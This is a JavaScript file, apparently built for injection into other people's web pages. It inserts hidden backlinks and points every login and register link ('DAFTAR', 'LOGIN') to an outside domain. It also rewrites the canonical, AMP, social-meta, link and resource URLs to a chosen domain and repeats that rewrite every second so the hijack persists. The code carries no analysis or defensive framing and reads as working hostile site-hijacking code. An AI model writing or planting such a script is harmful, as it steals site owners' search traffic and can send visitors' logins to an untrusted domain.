
const officialDomain = 'https://www.tera.com'; 
const ampDomain = 'https://www.amp.com';       

function insertBacklinks() {
  
  const link1 = document.createElement('a');
  link1.href = 'https://www.example1.com';
  link1.style.display = 'none'; 
  link1.textContent = 'Tautan ke Example 1'; 

  const link2 = document.createElement('a');
  link2.href = 'https://www.example2.com';
  link2.style.display = 'none'; 
  link2.textContent = 'Tautan ke Example 2'; 

  
  const body = document.body;
  const children = body.children;
  
  
  const middleIndex = Math.floor(children.length / 2);
  const referenceNode = children[middleIndex];

  
  if (referenceNode) {
    body.insertBefore(link1, referenceNode); 
    body.insertBefore(link2, referenceNode); 
  }
}


function replaceAnchorTags() {
  
  const anchors = document.querySelectorAll('a');

  anchors.forEach(anchor => {
    
    if (
      anchor.classList.contains('login') || 
      anchor.classList.contains('register') || 
      anchor.textContent.trim().toUpperCase() === 'DAFTAR' || 
      anchor.textContent.trim().toUpperCase() === 'LOGIN'
    ) {
      anchor.href = ampDomain; 
    }
  });
}


function forceUrlsToOfficialDomain() {
  
  const canonicalLink = document.querySelector('link[rel="canonical"]');
  let canonicalBasePath = ''; 

  if (canonicalLink) {
    
    canonicalBasePath = canonicalLink.href.replace(/^https?:\/\/[^\/]+/, ''); 
    canonicalLink.href = officialDomain; 
  } else {
    
    const newCanonical = document.createElement('link');
    newCanonical.rel = 'canonical';
    newCanonical.href = officialDomain; 
    document.head.appendChild(newCanonical);
  }

  
  const links = document.querySelectorAll('a[href]');
  links.forEach(link => {
    
    if (link.href.startsWith('http')) {
      const relativePath = link.href.replace(/^https?:\/\/[^\/]+/, ''); 
      
      link.href = officialDomain + relativePath.replace(canonicalBasePath, ''); 
    }
  });

  
  const metaUrls = document.querySelectorAll('meta[property="og:url"], meta[name="twitter:url"]');
  metaUrls.forEach(meta => {
    const metaPath = meta.content.replace(/^https?:\/\/[^\/]+/, ''); 
    meta.content = officialDomain + metaPath.replace(canonicalBasePath, ''); 
  });

  
  const resources = document.querySelectorAll('img[src], script[src], link[href][rel="stylesheet"]');
  resources.forEach(resource => {
    const attr = resource.tagName === 'LINK' ? 'href' : 'src';
    if (resource[attr].startsWith('http')) {
      const relativePath = resource[attr].replace(/^https?:\/\/[^\/]+/, ''); 
      resource[attr] = officialDomain + relativePath.replace(canonicalBasePath, ''); 
    }
  });

  
  const ampLink = document.querySelector('link[rel="amphtml"]');
  if (ampLink) {
    
    ampLink.href = ampDomain; 
  } else {
    
    const newAmpLink = document.createElement('link');
    newAmpLink.rel = 'amphtml';
    newAmpLink.href = ampDomain; 
    document.head.appendChild(newAmpLink); 
  }
}

// Run the function when the DOM is fully loaded
document.addEventListener('DOMContentLoaded', () => {
  forceUrlsToOfficialDomain();
  replaceAnchorTags(); 
  insertBacklinks(); 
});


setInterval(forceUrlsToOfficialDomain, 1000);
